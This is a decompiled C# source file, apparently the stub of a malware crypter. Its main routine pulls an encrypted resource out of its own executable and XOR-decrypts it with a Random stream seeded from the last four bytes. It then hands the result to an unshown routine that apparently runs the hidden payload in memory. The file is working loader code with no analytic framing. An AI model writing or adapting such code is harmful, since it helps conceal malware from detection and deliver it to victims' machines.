using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Module1
{
	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr FindResource(IntPtr intptr_0, string string_0, string string_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string moduleName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SizeofResource(IntPtr intptr_0, IntPtr intptr_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long CopyFileA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpExistingFileName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpNewFileName);

	[STAThread]
	public static void main()
	{
		string moduleName = Process.GetCurrentProcess().MainModule!.ModuleName;
		IntPtr moduleHandleA = GetModuleHandleA(ref moduleName);
		IntPtr intptr_ = FindResource(moduleHandleA, "0", "RT_RCDATA");
		IntPtr source = LoadResource(moduleHandleA, intptr_);
		int num = SizeofResource(moduleHandleA, intptr_);
		byte[] array = new byte[num - 1 + 1 - 1 + 1];
		Marshal.Copy(source, array, 0, num);
		int seed = BitConverter.ToInt32(array, Convert.ToInt32(array.Length - 4));
		array = (byte[])Utils.CopyArray((Array)array, (Array)new byte[array.Length - 3 + 1 - 1 + 1]);
		Random random = new Random(seed);
		byte[] array2 = new byte[array.Length - 1 + 1 - 1 + 1];
		random.NextBytes(array2);
		int num2 = Convert.ToInt32(array.Length - 1);
		for (int i = 0; i <= num2; i++)
		{
			array[i] = Convert.ToByte((byte)(array[i] ^ array2[i]));
		}
		GClass0.smethod_3(array, Process.GetCurrentProcess().MainModule!.ModuleName);
	}
}
